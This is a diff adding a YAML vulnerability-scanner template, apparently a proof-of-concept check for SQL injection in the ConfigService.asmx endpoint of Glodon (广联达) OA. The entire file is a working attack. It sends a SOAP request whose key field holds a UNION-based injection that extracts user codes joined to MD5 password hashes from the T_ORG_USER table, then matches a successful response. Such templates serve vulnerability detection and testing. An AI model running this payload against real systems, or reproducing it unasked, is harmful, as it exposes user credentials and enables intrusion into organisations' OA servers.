@@ -1,0 +1,22 @@
+name: 广联达OA-ConfigService.asmx-SQL
+description: >-
+  sql注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /Webservice/IM/Config/ConfigService.asmx
+    headers:
+      Content-Type: text/xml
+    body: |
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+         <soap:Body>
+           <GetIMDictionary xmlns="http://tempuri.org/">
+             <key>1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --</key>
+           </GetIMDictionary>
+         </soap:Body>
+        </soap:Envelope>
+    expression:
+      status: 200
+      body_all: ["?&gt;&lt;result"]
